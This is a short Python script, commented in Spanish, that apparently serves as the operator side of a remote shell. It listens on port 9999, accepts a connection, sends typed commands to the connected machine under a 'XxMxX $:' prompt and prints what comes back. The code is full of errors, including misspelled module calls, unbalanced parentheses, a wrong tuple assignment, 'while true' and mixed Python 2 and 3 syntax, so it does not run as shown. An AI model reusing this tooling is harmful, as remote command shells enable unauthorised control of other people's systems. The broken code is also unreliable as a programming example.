import socket
host = ''
port = 9999
#Crear socket
s = soket.soket(socket.AF_INET,socket.SOCK_STREAM)
#Enlazar
s.bind((host,port))
#Aceptar con + n max
s.listen(10)
print("Estableciendo conexion en el puerto "+str(port)
def aceptar_conexiones():
 conn.addr = s.accept()
 print("Conexion establecida ")+addr[0]
 comandos(conn)
 conn.close()
def comandos(conn):
 while true:
  cmd = raw.input("XxMxX $: ")
  if str.encode(cmd) == 'q':break
  if len(str.encode(cmd)) > 0):
   conn.send(str.encode(cmd))
   respuesta = str(conn.recv(1024))
   print respuesta
aceptar_conexiones()
